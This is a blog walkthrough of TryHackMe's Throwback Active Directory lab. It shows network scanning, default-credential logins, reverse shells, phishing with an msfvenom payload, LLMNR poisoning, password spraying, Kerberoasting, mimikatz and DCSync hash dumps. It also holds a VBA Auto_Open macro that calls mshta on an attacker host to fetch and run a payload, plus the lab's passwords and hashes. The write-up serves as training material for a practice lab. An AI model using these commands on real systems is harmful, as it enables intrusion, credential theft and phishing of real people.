---
layout: post
title:  "Throwback Writeup"
date:   2023-01-09 20:37:00 +0000
categories: thm
---

![throwback logo banner image](/assets/img/posts/throwback/banner.webp)

[Throwback] in Active Directory lab from **TryHackMe** that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.

## Contents
---

I tried really hard to organise this writeup, however with the nature of the lab I needed to move to and from machines quite often, therefore it may jump around a little. Please feel free to use this contents list to find exactly what you need:

1. [Network Enumeration](#enumeration)
2. [THROWBACK-FW01](#throwback-fw01)
 - [Logging In](#logging-in)
 - [Reverse Shell](#reverse-shell)
 - [Credentials](#credentials)
 - [Flags](#fw01-flags)
3. [THROWBACK-MAIL](#throwback-mail)
 - [Logging In](#logging-into-mail)
 - [Password Spraying](#password-spraying-mail)
 - [Flags](#mail-flags)
4. [THROWBACK WS01](#throwback-ws01)
 - [Phishing](#phishing)
 - [LLMNR Poisoning](#llmnr-poisoning)
 - [Kerberoasting](#kerberoasting)
 - [Flags](#ws01-flags)
5. [THROWBACK-PROD](#throwback-prod)
 - [Post Exploitation](#post-exploitation)
 - [Enumeration](#enumeration-with-seatbelt)
 - [Privilege Escalation](#privilege-escalation)
 - [Dumping Hashes and Passwords](#dumping-hashes-and-passwords) 
 - [Flags](#prod-flags)
6. [THROWBACK-TIME](#throwback-time)
 - [Malicious VBA Macro](#malicious-vba-macro)
 - [SQL Database](#sql-database)
 - [Flags](#time-flags)
7. [THROWBACK-DC01](#throwback-dc01)
 - [Password Spraying](#password-spraying-dc01)
 - [Logging In](#logging-into-dc01)
 - [Abusing DCSync Rights](#abusing-dcsync-rights)
 - [Flags](#dc01-flags)
8. [CORP-DC01](#corp-dc01)
 - [Logging In](#logging-into-corp-dc01)
 - [OSINT](#osint)
 - [Server Manager](#server-manager)
 - [Flags](#corp-dc01-flags)
9. [CORP-ADT01](#corp-adt01)

## Enumeration
---

The initial network scope looks like this:
![image of initial network map](/assets/img/posts/throwback/network_layout.webp)

Using nmap for initial enumeration, I discovered three of the in-scope machines and their open ports, as well as the name of the domain that they're apart of.

**Command**
```shell
nmap -sV -sC -p- -v 10.200.29.0/24 --min-rate 5000
```

**THROWBACK-FW01** (10.200.29.219)
```shell
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|_  4096 3804a0a1d0e6abd97dc0daf366bf7715 (RSA)
53/tcp  open  domain   (generic dns response: REFUSED)
80/tcp  open  http     nginx
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.200.29.138/
443/tcp open  ssl/http nginx
|_http-title: pfSense - Login
|_http-favicon: Unknown favicon MD5: 5567E9CE23E5549E0FCD7195F3882816
| ssl-cert: Subject: commonName=pfSense-5f099cf870c18/organizationName=pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5f099cf870c18
| Issuer: commonName=pfSense-5f099cf870c18/organizationName=pfSense webConfigurator Self-Signed Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-11T11:05:28
| Not valid after:  2021-08-13T11:05:28
| MD5:   fe06fa474d838454e67a18407ea8d101
|_SHA-1: 672e5f8f9b287cad5789c5becb1cf3f26c63dfb2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.93%I=7%D=1/8%Time=63BB2F58%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,E,"\0\x0c\0\x06\x81\x05\0\0\0\0\0\0\0\0");
```

**THROWBACK-MAIL** (10.200.29.232)
```shell
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16c4ef3847a61726faa58c24bffefad0 (RSA)
|   256 95e9e05ea4f691920dd34c9d1e633673 (ECDSA)
|_  256 7d82c060336364ed23c49d4f458d100a (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 2D267521ED544C817FADA219E66C0CCC
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Throwback Hacks - Login
|_Requested resource was src/login.php
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: IDLE more SASL-IR ENABLE have LOGIN-REFERRALS listed capabilities Pre-login IMAP4rev1 STARTTLS ID LITERAL+ post-login LOGINDISABLEDA0001 OK
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Issuer: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-25T15:51:57
| Not valid after:  2030-07-23T15:51:57
| MD5:   adc4c6e2d74fd9ebccde96aa5780bb69
|_SHA-1: 93aa5da038298ca3aa6bf1484f921ed0c568a942
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Issuer: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-25T15:51:57
| Not valid after:  2030-07-23T15:51:57
| MD5:   adc4c6e2d74fd9ebccde96aa5780bb69
|_SHA-1: 93aa5da038298ca3aa6bf1484f921ed0c568a942
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IDLE SASL-IR ENABLE more have LOGIN-REFERRALS ID capabilities Pre-login OK IMAP4rev1 LITERAL+ post-login listed AUTH=PLAINA0001
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**THROWBACK-PROD** (10.200.29.219)
```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 85b81f80463d910f8cf2f23f5c876772 (RSA)
|   256 5c0d46e942d44da036d619e5f3ce4906 (ECDSA)
|_  256 e22acb39850f7306a9239dbfbef7500c (ED25519)
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Throwback Hacks
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local
| Issuer: commonName=THROWBACK-PROD.THROWBACK.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-07T17:54:36
| Not valid after:  2023-07-09T17:54:36
| MD5:   6e5dc09a9b9f46a346ca0e4cbe314946
|_SHA-1: c4f43d1f164d858a57e15ef171975c6698a9383e
|_ssl-date: 2023-01-08T21:04:29+00:00; -3s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -4s
| smb2-time:
|   date: 2023-01-08T21:02:56
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```

## Throwback FW01
---
Going to the firewall's web interface, it confirmed that it is running **pfsense**, which has an administrator login panel.

![pfsense login page](/assets/img/posts/throwback/1_pfsense_login_page.webp)

### Logging In

However, the default credentials were never changed and therefore, I was able to simply login to the panel using the  default credentials `admin:pfsense`.

![logged in to pfsense panel](/assets/img/posts/throwback/2_pfsense_admin.webp)

### Reverse Shell

Then, after poking around what the panel has to offer, I found a diagnostics page (under Diagonistics > Command Prompt), which conveniently allowed for code execution in both bash shell and PHP form, as well as file upload and download. So naturally, I executed [this](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) PHP reverse shell in the interface, opened a listener on my machine, and got root access to THROWBACK-FW01. That was easy.

![php reverse shell in diagnostics tab](/assets/img/posts/throwback/3_pfsense_phprs.webp)

![reverse shell from my machine](/assets/img/posts/throwback/4_pfsense_root.webp)

### Credentials

Also in `/var/logs/` I found the unusual log `login.log`, which contained encrypted credentials to a user **HumphreyW**.

![humphreyws credentials in login.log](/assets/img/posts/throwback/6_humphreyw_creds.webp)

His password was easily cracked using [Crackstation](https://crackstation.net/):

![humphreyws cracked password](/assets/img/posts/throwback/7_humphrey_cracked.webp)

### FW01 Flags

Using the following command, I was able to find search for .t
xt files on the machine to find the flags:

```shell
find / -iname "*.txt" 2>&1
```

This way, I found both flags in these locations:

![fw01 flags](/assets/img/posts/throwback/5_fw01_flags.web
p)

## Throwback MAIL
---

### Logging into MAIL

This is the mail server, which also has a web interface and login page. The guest credentials to login `tbhguest:WelcomeTBH1!` were hardcoded just above the form.

![mail interface guest credentials](/assets/img/posts/throwback/8_mail_login.webp)

The address book contained a list of employee names and emails, which I compiled into seperate documents to use later on.

![list of usernames and emails](/assets/img/posts/throwback/11_emails_and_usernames.webp)

### Password Spraying MAIL

I decided to use the username list and along with a small list of commonly used passwords to bruteforce the employee credentials.

![lists of usernames and passwords](/assets/img/posts/throwback/12_users_pass_lists.webp)

First, I captured the login request to the server using a web proxy and **BurpSuite**, to take note of the field identifiers to use in **Hydra**.

![burpsuite login request](/assets/img/posts/throwback/13_burp_request.webp)

Then, I used this Hydra command:

```shell
hydra -L mail_users.txt -P mail_pass.txt 10.200.29.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect.' -I
```

And successfully found these users' passwords:

![hydra found passwords](/assets/img/posts/throwback/14_hydra_found.webp)

### MAIL Flags

I found the first flag in the "Welcome" email in guest the inbox.

![first flag](/assets/img/posts/throwback/9_flag1.webp)

And the second flag in the address book.

![second flag](/assets/img/posts/throwback/10_flag2.webp)

# THROWBACK WS01
---

### Phishing

At this point however, I needed a way to move to another machine on the network. And the next target was **THROWBACK-WS01**, an employee workstation.

To get access to a workstation, I chose to launch a phishing campaign against the employee email list, posing as IT support, telling employee's to update the note-taking software they're using, which would actually be a reverse shell pointing back to me.

I used the following MSFVenom command to generate a reverse shell exe:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o shell.exe
```

And the following email as the vehicle:

![phishing email](/assets/img/posts/throwback/15_phishing_email.webp)

Then, I setup a shell handler using msfconsole:

![msfconsole handler](/assets/img/posts/throwback/16_handler.webp)

And got a meterpreter shell as the user **BlaireJ** on their workstation.

![meterpreter shell](/assets/img/posts/throwback/17_meterpreter_shell.webp)

### LLMNR Poisoning

Then, with the shell open, I used this responder command:

```shell
sudo responder -I tun0 -dw -v
```

To spoof the destination of LLMNR authorisation requests on the network, and intercept **PetersJ**'s NTMLv2 password hash. I personally found [this](https://predatech.co.uk/llmnr-nbt-ns-poisoning-windows-domain-environments/) article helpful in understanding this process and how it works.

![llmnr poisoning](/assets/img/posts/throwback/20_poison.webp)

This hash would take a very long time to crack on my laptop, so I used [Penglab](https://github.com/mxrch/penglab) to use a much faster machine with a GPU via Google Collab.

On Penglab, I used this hashcat command (with [this](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) rule):

```shell
hashcat -m 5600 -r OneRuleToRuleThemAll.rule --force petersj.hash.txt /content/wordlists/rockyou.txt
```

And successfully cracked PetersJ's password `Throwback317`:

![petersjs password cracked](/assets/img/posts/throwback/21_petersj_cracked.webp)

## THROWBACK-PROD
---

### Post Exploitation

Post exploitation, I used the [Empire](https://github.com/EmpireProject/Empire) framework as well as [Starkiller](https://github.com/BC-SECURITY/Starkiller), a front-end for it together as my C2 infrastructure.

Very easily setup and ran with:

```shell
sudo ./ps-empire server
sudo ./starkiller-1.12.0.AppImage --no-sandbox
```

![empire and starkiller setup](/assets/img/posts/throwback/22_empire_starkiller.webp)

And that opened access to the Starkiller panel running on localhost.

![starkiller](/assets/img/posts/throwback/23_starkiller_interface.webp)

To begin further exploitation, I needed to setup a listener and a stager for PetersJ to run, to use the account as an agent.

To do this I firstly created a HTTP listener from the listeners tab:

![starkiller listener](/assets/img/posts/throwback/24_starkiller_listener.webp)

Then I made the stager, a Windows batch file to be ran on the compromised workstation:

![starkiller stager](/assets/img/posts/throwback/25_starkiller_stager.webp)

### Enumeration with Seatbelt

With all of that set up, now it was time for some post exploitation enumeration using **Seatbelt** from [Ghostpacks Compiled Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries). To use this with Starkiller, I firstly needed to RDP into the PROD machine as PetersJ using this **xfreerdp** command:

```shell
xfreerdp /u:PetersJ /p:'Throwback317' /v:10.200.29.219
```

![xfreerdp](/assets/img/posts/throwback/26_xfreerdp.webp)

Once I was in, I downloaded both the `launcher.bat` and `seatbelt.exe` files from a webserver on my machine.

![wget seatbelt and launcher](/assets/img/posts/throwback/27_wget.webp)

Then, I ran the stager in PowerShell to load the user as an agent in Starkiller.

![agent](/assets/img/posts/throwback/28_agent.webp)

Now that I had an agent, I executed the `PowerShell/situational_awareness/host/seatbelt` Empire module to begin enumeration.

![seatbelt empire module](/assets/img/posts/throwback/29_seatbelt_module.webp)

This produced a lot of output, but the main focus is the CredEnum result, showing an admin user by the name of **admin-petersj** has saved credentials on the machine.

![seatbelt output](/assets/img/posts/throwback/30_admin_petersj.webp)

### Privilege Escalation

Using that username , I was able to utilise the `runas` command to use the saved credentials and execute `cmd.exe`, essentially escalating my privileges:

```shell
runas /savecred /user:admin-petersj /profile "cmd.exe"
```

![privesc to admin-petersj](/assets/img/posts/throwback/31_petersj_privesc.webp)

### Dumping Hashes and Passwords

Now that I had elevated privilages, I could run the stager in the command prompt and use admin-petersj as a privilaged agent: 

![privilaged agent](/assets/img/posts/throwback/33_admin_agent.webp)

And run Empire's **mimikatz** module to dump the hashes and passwords of logged in users.

![mimikatz empire module](/assets/img/posts/throwback/34_mimikatz_module.webp)

There's a lot of output in the report:

![mimikatz output](/assets/img/posts/throwback/35_mimikatz_output.webp)

Luckily, Starkiller formats the output cleanly to into the credentials tab:

![mimikatz creds](/assets/img/posts/throwback/36_mimikatz_creds.webp)

### PROD Flags

I was able to read all three flags on the PROD machine in the following locations:

![prod flags](/assets/img/posts/throwback/32_prod_flags.webp)

## THROWBACK-WS01
---

I had to return to WS01, a machine that could allow me to pivot through the domain trusts into the next network.

### Pivoting

To move deeper, I needed to pivot. To begin this process, I firstly setup a reverse shell on the PROD machine, a meterpreter listener and then autoroute via msfconsole:

![autoroute](/assets/img/posts/throwback/37_autoroute.webp)

After that I setup a SOCKS4 proxy with proxychains and msfconsole's `socks_proxy` auxiliary module, and used this **crackmapexec** command:

```shell
proxychains -q crackmapexec smb 10.200.29.0/24 -p 1080 -u BlaireJ -d THROWBACK -H c374ecb7c2ccac1df3a82bce4f80bb5b
```

![proxychains crackmapexec](/assets/img/posts/throwback/38_crackmapexec.webp)

However, I needed access to WS01 in order to pivot fur
ther but this shows that I could do that through the domain user BlaireJ. To access BlaireJ's account on WS01, I used RDP again but this time through the proxy with this command:

```shell
proxychains xfreerdp /u:BlaireJ /p:'7eQgx6YzxgG3vC45t5k9' /v:
10.200.29.222
```

![blairej rdp through proxy](/assets/img/posts/throwback/39_blairej_rdp.webp)

At the same time, I setup [BloodHound](https://github.com/BloodHoundAD/BloodHound) with a neo4j backend to begin enumerating the Active Directory:

![bloodhound login](/assets/img/posts/throwback/40_bloodhound_login.webp)

Now, with Bloodhound setup and full access to the domain user BlaireJ, I could start collecting data. To do this, I used a PowerShell collector called [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1). I imported it into PowerShell, and told it to collect all the data it could on the Active Directory:

![sharphound collection in powershell](/assets/img/posts/throwback/41_sharphound_collection.webp)

Once the collection was completed, I transfered the data over to my machine using proxychains and scp:

![sharphound data scp](/assets/img/posts/throwback/42_sharphound_scp.webp)

From there, I uploaded it into BloodHound:

![bloodhound data upload](/assets/img/posts/throwback/43_bloodhound_import.webp)

And was able to query the data for very specific information. This included a full list of domain admin accounts for example:

![bloodhound listing domain admins](/assets/img/posts/throwback/44_bloodhound_da.webp)

### Kerberoasting

BloodHound also allowed me to query for kerbaroastable accounts, one of which being the account **sqlservice**, for - suprisingly - the SQL database running on one of the machines:

![sqlservice is kerbaroastable](/assets/img/posts/throwback/46_bloodhound_sqlservice.webp)

To perform the attack on the sqlservice account, I used Impacket's [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) script, to recieve a kerberos ticket containing the user's NTLM hash.

![kerberoasting sqlservice](/assets/img/posts/throwback/47_getuserspn_sqlservice.webp)

To decrypt the ticket and crack the password hash, I again used penglab and hashcat to get the accounts password `mysql337570`:

![cracking ticket](/assets/img/posts/throwback/48_sqlservice_cracked.webp)

### WS01 Flags

I found the first flag for this machine on BlaireJ's desktop:

![flag 5](/assets/img/posts/throwback/18_flag5.webp)

The second on HumphreyW's desktop:

![flag 6](/assets/img/posts/throwback/19_flag6.webp)

And the third in the description of one of the domain admins in BloodHound:

![domain admin with flag](/assets/img/posts/throwback/45_bloo
dhound_flag.webp)

## THROWBACK-TIME
---

My next target was the THROWBACK-TIME machine, a server used for employees to upload time keeping spreadsheets. To firstly access the web logon interface, I used [FoxyProxy]() - a web proxy - on the port 1080:

![timekeep server through proxy](/assets/img/posts/throwback/49_timekeep_webproxy.webp)

But no credentials were being re-used, so I logged back in to the mail server, to find a password reset email in **MurphyF**'s inbox:

![murphyF login](/assets/img/posts/throwback/50_murphy_passwordreset.webp)

I added the virtual host `timekeep.throwback.local` to my `/etc/hosts` and clicked the link to reset his email to `PASSWORD`.

I then logged in to MurphyF's account to find Timesheet.xlsm upload form:

![timesheet upload form](/assets/img/posts/throwback/51_timekeep_upload.webp)

So, I needed a way to use the Timesheet.xlsm to get a shell on the server.

### Malicious VBA Macro

To do this, I used this VBA macro:
```vba
Sub macro()
    PID = Shell("mshta.exe http://10.50.27.129:8080/PGu0H7bw.hta")
End Sub

Sub Auto_Open()
    macro
End Sub
```

And saved it into a fake Timesheet.xlsm (macro enabled excel document) to upload:

![macro in excel](/assets/img/posts/throwback/52_macro.webp)

![uploading xlsm](/assets/img/posts/throwback/54_uploading_timekeep.webp)

![admin will review page](/assets/img/posts/throwback/55_adminreview.webp)

Once uploaded, with a hta server running using msfconsole, a few seconds later I got a shell as the **Administrator**.

![admin shell on time](/assets/img/posts/throwback/56_admin_meterpreter.webp)

However, I couldn't dump the hashes in this under-privileged process, so I migrated into the `mslogon.exe` process (an NT AUTHORITY\SYSTEM process) and ran meterpreter's **hashdump** command to dump the NTLM hashes stored on the system:

![time hashdump](/assets/img/posts/throwback/57_hashdump.webp)

This password was easily cracked using Crackstation to reveal their password `keeperoftime`:

![timekeepers hash cracked](/assets/img/posts/throwback/58_timekeeper_cracked.webp)

### SQL Database

I then used these credentials to SSH into the TIME server, and access the SQL databses:

![time ssh](/assets/img/posts/throwback/59_timekeeper_ssh.webp)

![sql database](/assets/img/posts/throwback/60_sqldb.webp)

This revealed a list of users and passwords for the timekeep server:

![timekeep server users](/assets/img/posts/throwback/61_timekeep_userdb.webp)

As well as a list of domain users:

![domain users](/assets/img/posts/throwback/62_domainusers.webp)

Which I copied and formatted in Vim into a seperate document:

![formatted domain users](/assets/img/posts/throwback/63_formatted_domainusers.webp)

### TIME Flags

The first flag for this machine was from the password reset l
ink in MurphyF's inbox:

![murphy password reset flag](/assets/img/posts/throwback/53_
murphyflag.webp)

The second was in the timekeepusers database:

![timekeepusers flag](/assets/img/posts/throwback/61_timekeep_userdb.webp)

And the third was the root flag on the Administrators Desktop:

![time root flag](/assets/img/posts/throwback/64_timerootflag.webp)

## THROWBACK-DC01
---

### Password Spraying DC01

I then used the list of domain users from the databse in combination with the weak password list that I used to spray the mail server, to password spray the Domain Controller (DC01) with crackmapexec:

```shell
proxychains -q crackmapexec smb 10.200.29.117 -u domainusers.
txt -p mail_pass.txt --continue-on-success
```

Doing this, I found the domain user **JeffersD**'s password `Throwback2020`.

![jeffersd account password](/assets/img/posts/throwback/65_jeffersd_dc01.webp)

### Logging into DC01

I logged into the domain controller with these new credentials to find a note from the domain admin in JeffersD's Documents folder containing an account called **backup**'s password.

![backup credentials in documents](/assets/img/posts/throwback/66_backupcreds.webp)

Referring back to BloodHound, this account had DCSync rights, which could easily be abused.

![backup dcsync in bloodhound](/assets/img/posts/throwback/67_dcsync_bloodhound.webp)

### Abusing DCSync Rights

To use this account to escalate into the domain admin account, I used [secretsump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from Impacket with the following syntax:

```shell
sudo proxychains python3 secretsdump.py -dc-ip 10.200.29.117 THROWBACK/backup@10.200.29.117
```

To dump the credentials of all users on the domain.

![dumped dcsync creds](/assets/img/posts/throwback/68_dcsync_dump.webp)

Including the domain admin **MercerH**, who's password I was able to crack again using hashcat and penglab.

![mercerh password cracked](/assets/img/posts/throwback/69_mercerh_password.webp)

![domain admin logged in](/assets/img/posts/throwback/70_dc01admin.webp)

### DC01 Flags

The first flag was on JeffersD's Desktop.

![dc01 user flag](/assets/img/posts/throwback/71_dc01userflag.webp)

The second was on MercerH's Desktop.

![dc01 root flag](/assets/img/posts/throwback/72_dc01rootflag
.webp)

## CORP-DC01
---

### Logging into CORP-DC01

Then time to move into the **CORPORATE.local** trust via DC01. And the key was again, **MercerH**. The account that linked both domain controllers.

After a long fight with proxy routes, I RDP'd into CORP-DC01 as MercerH. Once in, I again ran another reverse shell and re-routed my SOCKS proxy so that I could "see" into the rest of the CORP domain.

![corp-dc01 proxy reroute](/assets/img/posts/throwback/79_reroute.webp)

![corp-dc01 user rdp](/assets/img/posts/throwback/73_corpdc_shell.webp)

After poking around the machine, I found a `server_update.txt` file on the Administrator's Desktop that contained information about two more virtual hosts, as well as information about company social media, specifically mentioning **Github** and **Twitter**.

![server update txt](/assets/img/posts/throwback/74_server_update.webp)

### OSINT

So began my OSINT. I checked the company Twitter mentioned in the text file, and they are following the **Lead Developer Rikka Foxx** who also has their Github linked in their bio.

![rikka foxx twitter](/assets/img/posts/throwback/75_rikka_twitter.webp)

Then going through their Github repositories and code, I find the source for the Timekeep server, which still contained its **db_connect.php** file. The file used to allow interaction between the database and PHP. It also is used to store database login credentials and settings. The most up-to-date version of this file had the credentials redacted, however after checking the version history of this file, I found credentials for **DaviesJ**.

![db connect creds](/assets/img/posts/throwback/76_dbconnect_credentials.webp)

### Server Manager

But for a while I wasn't sure where to use them. Until I started exploring the **Server Manager** and discovered another CORP machine in the DNS Manager: **CORP-ADT01**.

![corp adt01 dns manager](/assets/img/posts/throwback/80_corpadt01.webp)

### CORP DC01 Flags

The user flag was on MercerH's Desktop.

![corp dc01 user flag](/assets/img/posts/throwback/77_corpdc_userflag.webp)

The root flag was on Administrator's Desktop.

![corp dc01 root flag](/assets/img/posts/throwback/78_corpdc_rootflag.webp)

A flag was on Rikka's Twitter.

![twitter flag](/assets/img/posts/throwback/81_twitterflag.webp)

The final flag was on Rikka's Github.

![github flag](/assets/img/posts/throwback/82_githubflag.webp)

## CORP-ADT01
---

DaviesJ's credentials worked on CORP-ADT01.

![corp adt01 login](/assets/img/posts/throwback/83_corpadt01_daviesj.webp)

After looking around the machine again, there was another file in the Administrator's `Documents` folder. This time, `email_update.txt`. This document revealed information about the email address structure, as well as again referencing **mail.corperate.local**.

![email update txt](/assets/img/posts/throwback/84_emailupdate.webp)

I had to get credentials for this server. So again, I needed to incorperate more OSINT.

### More OSINT

This time, I used [LeetLinked](https://github.com/Sq00ky/LeetLinked), an OSINT tool focused on targeting companies and individuals on LinkedIn.

[Throwback]: https://tryhackme.com/room/throwback
